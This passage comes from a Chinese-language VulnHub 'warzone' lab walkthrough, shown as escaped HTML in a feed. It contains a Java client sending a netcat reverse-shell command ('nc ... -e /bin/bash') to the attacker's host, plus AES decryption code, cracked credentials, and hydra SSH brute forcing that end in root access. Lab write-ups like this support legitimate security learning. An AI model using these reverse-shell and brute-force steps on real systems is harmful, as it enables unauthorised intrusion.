class=&#34;line&#34;&gt;import java.io.ObjectOutputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.net.Socket;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Starter &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static Socket socket = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static ObjectOutputStream os;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static Token token;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		socket = new Socket(&amp;quot;warzone.local&amp;quot;, 4444);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os = new ObjectOutputStream(socket.getOutputStream());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		token = new&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		Token(&amp;quot;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&amp;quot;, &amp;quot;astronaut&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		RE list = new RE();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setToken(token);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setOption(&amp;quot;VIEW&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setValue(&amp;quot;VALUE&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		list.setCmd(&amp;quot;nc 192.168.0.168 4444 -e /bin/bash&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os.writeObject(list);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		ObjectInputStream is = new ObjectInputStream(socket.getInputStream());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		RE response = (RE) is.readObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		os.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		socket.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		System.out.println(response.getValue());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;执行之后 shell 成功反弹，拿到了 exomorph 的权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1446.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;java脚本解密aes&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java脚本解密aes&#34;&gt;#&lt;/a&gt; java 脚本解密 AES&lt;/h3&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;标准化&lt;span class=&#34;built_in&#34;&gt;tty&lt;/span&gt;就不多说了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;script -qc /bin/bash /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm;reset;stty rows 64 columns 118&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;此用户下有两个文件，cat 发现乱码，file 检查文件属性，strings 查看内容&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1447.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到了一个密码，和一个 jar 文件，将 jar 文件拉到本地导入到 jd-gui&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1448.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;CrypoException 是一个普通的类&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1449.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;Cryptor 是一个 AES 加密文件，加密过程中会调用这个里边的方法&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1450.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;Main 函数定义要加密的 key，以及加密后的文件的路径&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1451.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;现在就用来写一个解密文件，用来将我们得到的密码 $:2Czq$(解密&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;先定义解密函数，通过如下方法来调用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public static void decrypt(String key, File inputFile, File outputFile) throws CryptoException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1452.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保存路径，并且调用解密方法，最后将我们解密后的内容查看&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package alienum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.File;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static String inputPath = &amp;quot;/Users/chentuo/JavaProjects/alienum/aliens.encrypted&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static String outputPath = &amp;quot;/Users/chentuo/JavaProjects/alienum/aliens.txt&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public Main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		String key = &amp;quot;w4rz0nerex0gener&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		File inputFile = new File(inputPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		File decryptedFile = new File(outputPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			alienum.Cryptor.decrypt(key, inputFile, decryptedFile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; catch (CryptoException var5) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			System.out.println(var5.getMessage());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			var5.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1453.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解密之后的 txt 文件不能用 cat 来查看会显示乱码，用 file 命令确定是一个 data 类型后，用 strings 查看得到了解密后的文件内容&lt;br&gt;
- minotaur:m1nom1no…&lt;br&gt;
-scylla:scyscy…&lt;br&gt;
-echidna:ech1ech1…&lt;br&gt;
-cyclops:cyccyc…&lt;br&gt;
-anunnaki:nak1nak1…&lt;br&gt;
-anunnaki:nak1nak2…&lt;br&gt;
-anunnaki:nakinaki…&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1454.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;sshpass-连接靶机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sshpass-连接靶机&#34;&gt;#&lt;/a&gt; sshpass 连接靶机&lt;/h3&gt;
-&lt;p&gt;得到了一串用户名和密码的组合，可能是 ssh 的用户和密码&lt;br&gt;
- &lt;code&gt;cat aliens.txt | cut -d &#39;:&#39; -f 1 &amp;gt; user.txt&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;cat aliens.txt | cut -d &#39;:&#39; -f 2 &amp;gt; pass.txt&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1455.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;检查一下用户名和密码文件是否正确&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1456.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1457.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;hydra -L user.txt -P pass.txt ssh://192.168.31.53 -f -t 32 -I -vV&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1458.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1459.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用 ssh 成功连接到了靶机中&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1460.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;第一次登陆成功之后，第二次就可以用 sshpass 在命令行输入密码直接连接&lt;br&gt;
- &lt;code&gt;sshpass -p nak1nak1.. ssh anunnaki@192.168.0.186&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1461.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;java代码分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java代码分析&#34;&gt;#&lt;/a&gt; java 代码分析&lt;/h3&gt;
-&lt;p&gt;检索服务器文件，看到提示文件与一个 gpg 的加密文件，info.txt 提示要用–batch 来解密 gpg 文件，否则不会让输入密码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1462.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;然而直接解密是可以弹出来输入密码的界面的，输入 ssh 爆破出来的密码 nak1nak1… 可以成功解密 gpg 为 jar 文件&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1463.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;同样的下载到本地，用 jd-gui 打开，开始阅读源码，Cryptor.class 里边定义了一个加、解密方法&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1464.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;Main.class 中设有盐值，并且在条件判断正确时为打印 passwd&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1465.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;Recources.class 里边是一些加密的字符串&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1466.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;编写 java 代码，进行解密，代码内容如下&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import java.security.NoSuchAlgorithmException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.BadPaddingException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.IllegalBlockSizeException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.NoSuchPaddingException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Cryptor cryptor = new Cryptor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	String plaintext = cryptor.decrypt(cryptor.decrypt(&amp;quot;pr0tect1on1smust&amp;quot;, &amp;quot;/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ=&amp;quot;), &amp;quot;jJ2Mrz4wjZDMSPwDr6TolQ==&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	System.out.println(&amp;quot;[+] Success, the password is : &amp;quot; + plaintext);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1467.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;运行代码，成功解密出来了密码为 ufo_phosXEN&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1468.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;判断一下这个密码属于哪个用户，发现就是 root 用户的&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1469.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
